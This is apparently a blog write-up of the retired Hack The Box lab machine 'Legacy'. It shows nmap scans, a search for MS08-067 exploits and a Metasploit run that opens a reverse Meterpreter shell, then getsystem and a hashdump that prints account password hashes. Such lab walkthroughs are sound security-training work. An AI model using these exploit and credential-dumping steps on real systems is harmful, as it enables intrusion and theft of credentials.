---
layout: post
title: Hack the Box - Legacy
date: 2020-03-14 20:43:22 +0100
description: Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.
img: legacy.png
fig-caption: Legacy
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~]
└─$ sudo nmap -p- -T4 10.129.113.57                                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 13:41 GMT
Nmap scan report for 10.129.113.57
Host is up (0.017s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
```
After running initial port enumeration the ports that seem most of interest are 139,445. A quick vulnerability scan reveals it is potentially vulnerable to MS08-067.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~]
└─$ sudo nmap -p139,445 --script vuln 10.129.113.57 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 13:44 GMT
...
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
```
## Foothold
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox]
└─$ searchsploit ms08-067
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Pytho | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)     | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-06 | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack C | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS0 | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS0 | windows/remote/7132.py
--------------------------------------------------------- ---------------------------------
```
Searching through exploitdb reveals that there are a number of exploits that we could use. As there is a metasploit module listed we will give that a quick go first. We can open up the msfconsole and search for the vulnerability there.
```
msf6 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```
After finding it we select it, enter the appropriate IP's as options and give it a run. This should return as a meterpreter session.
```
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.27:4444 
[*] 10.129.113.57:445 - Automatically detecting the target...
[*] 10.129.113.57:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.113.57:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.113.57:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.129.113.57
[*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.129.113.57:1057) at 2021-03-14 14:08:04 +0000

meterpreter >
```
## Privilege Escalation
Once we have the meterpreter session, it is slightly more diifcult to enumerate which user we are as it is pre Windows XP SP2 and thus the "whoami" command does not exist yet. But we can either use PsExec to get a system shell or simply use the "getsystem" meterpreter command 
```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > hashdump
Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::
john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::
```
